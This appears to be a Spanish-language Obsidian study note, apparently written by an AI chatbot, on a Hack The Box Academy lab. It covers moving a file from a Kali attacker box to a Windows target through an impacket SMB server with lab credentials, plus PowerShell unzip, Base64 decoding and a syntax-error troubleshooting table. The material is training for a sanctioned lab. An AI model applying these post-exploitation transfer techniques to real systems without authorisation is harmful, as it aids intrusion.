¡Eso es! Nada se siente mejor que ver aparecer ese hash después de pelear con la terminal. Aquí tienes un resumen estructurado y "limpio" para tu **Obsidian**, enfocado en transferencia de archivos y solución de errores de sintaxis en Windows/Kali.

---

# 🚩 HTB: Windows File Transfer & Post-Exploitation

## 🛠️ Escenario

- **Objetivo:** Transferir un archivo `.zip`, descomprimirlo y obtener un hash.
    
- **Víctima:** Windows Server (`10.129.201.55`) vía RDP.
    
- **Atacante:** Kali Linux (VPN `10.10.15.86`).
    

---

## 🛰️ 1. Transferencia vía SMB (Impacket)

Para máquinas Windows modernas (Server 2012+), es necesario usar **autenticación** y **SMB2**, ya que las políticas de invitado suelen estar bloqueadas.

### En Kali (Atacante)

Lanzar el servidor en la carpeta donde está el archivo:

Bash

```
sudo impacket-smbserver pwn . -smb2support -user htb-student -password 'HTB_@cademy_stdnt!'
```

### En Windows (Víctima)

1. **Mapear la unidad:**
    
    PowerShell
    
    ```
    net use Z: \\10.10.15.86\pwn /user:htb-student 'HTB_@cademy_stdnt!'
    ```
    
2. **Copiar el archivo:**
    
    PowerShell
    
    ```
    copy "Z:\upload_win.zip" C:\Users\htb-student\Desktop\win.zip
    ```
    

---

## 📦 2. Manipulación de Archivos (PowerShell)

### Descomprimir

PowerShell

```
Expand-Archive .\win.zip -DestinationPath . -Force
```

### Ejecutar Herramientas de Lab

Si el comando no está en el PATH, ejecutarlo desde el directorio actual:

PowerShell

```
.\hasher.exe upload_win.txt
```

---

## 🧪 3. Método Alternativo: PowerShell Base64

Útil cuando SMB está bloqueado por Firewall.

**Decodificar un String a Binario/Texto:**

PowerShell

```
[IO.File]::WriteAllBytes("C:\ruta\salida.txt", [Convert]::FromBase64String("BASE64_AQUÍ"))
```

> [!CAUTION] Error común: `>>` en PowerShell
> 
> Si ves `>>` en la terminal, significa que dejaste un comando **abierto** (falta una comilla `"` o un paréntesis `)`). Usa `Ctrl + C` para abortar.

---

## 🔍 4. Troubleshooting: Errores de Sintaxis

|**Error**|**Causa**|**Solución**|
|---|---|---|
|`Get.FileHash`|Uso de puntos en lugar de guiones.|Usar `Get-FileHash`.|
|`PositionalParameterNotFound`|Demasiados espacios o argumentos sin comillas.|Envolver rutas con espacios en `" "`.|
|`ERRCONNECT_DNS_NAME_NOT_FOUND`|IP mal escrita (ej. `10.10..55`).|Verificar puntos y números.|

---

> [!TIP] Tip Pro: Portapapeles en RDP
> 
> Si el clic derecho no pega en PowerShell, activa el **QuickEdit Mode** en las propiedades de la ventana o reinicia el proceso `rdpclip.exe` desde el Administrador de Tareas de la víctima.
